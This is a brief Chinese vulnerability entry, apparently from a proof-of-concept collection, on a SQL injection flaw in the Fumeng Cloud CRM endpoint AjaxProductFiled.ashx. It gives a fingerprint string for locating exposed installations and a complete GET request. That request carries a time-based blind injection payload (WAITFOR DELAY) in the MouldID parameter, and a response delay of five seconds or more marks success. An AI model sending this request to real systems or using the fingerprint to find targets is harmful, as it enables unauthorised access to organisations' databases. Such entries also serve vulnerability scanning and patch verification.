# 孚盟云CRMAjaxProductFiled.ashx存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`GET /m/Dingding/Ajax/AjaxProductFiled.ashx?method=savePuductFiled&MouldID=-1'WAITFOR DELAY'0:0:5'-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s